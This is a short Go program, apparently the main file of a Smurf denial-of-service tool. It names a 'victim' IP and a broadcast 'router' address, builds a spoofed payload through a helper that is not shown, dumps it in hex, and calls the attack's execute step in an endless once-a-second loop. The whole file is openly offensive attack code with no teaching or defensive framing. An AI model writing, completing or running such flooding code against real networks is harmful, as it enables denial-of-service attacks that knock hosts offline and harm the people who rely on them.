package main

import (
	"encoding/hex"
	"log"
	"net"
	"time"
)

func main() {
	victim := net.IP{192, 168, 1, 73}
	router := net.IP{192, 168, 1, 255}

	s, err := newSmurf(victim, router)
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
	for {
		log.Printf("[smurf] victim (%s), with router (%s)", victim.String(), router.String())
		if err := s.execute(); err != nil {
			log.Printf("[smurf] error: %s", err)
		}
		time.Sleep(time.Second * 1)
	}

}
